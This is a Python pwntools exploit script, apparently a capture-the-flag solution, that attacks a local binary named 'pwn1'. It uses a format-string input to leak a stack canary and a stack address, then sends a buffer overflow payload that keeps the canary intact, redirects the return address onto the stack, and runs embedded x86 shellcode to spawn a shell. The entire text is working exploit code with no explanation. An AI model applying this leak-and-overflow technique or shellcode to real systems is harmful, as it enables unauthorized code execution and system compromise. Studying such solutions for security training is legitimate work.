from pwn import *

shellcode = "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73"
shellcode += "\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0"
shellcode += "\x0b\xcd\x80"

p = process('./pwn1')

#raw_input('deubg')

p.recvuntil('name:')
p.sendline('%p.'*40)
leak_data = p.recvuntil('messages:')
address = leak_data.split('.')
#for i in range(len(address)):
#    print str(i)+':'+str(address[i])
canary = address[30]
print 'canary:%s' % canary
stack_addr = address[33]
print 'stack_addr %s' % stack_addr

shellcode_addr = int(stack_addr,16)-0x90+0x8

payload = 'a'*100 + p32(int(canary,16)) + 'a'*12 + p32(shellcode_addr) + shellcode

p.sendline(payload)

p.interactive()
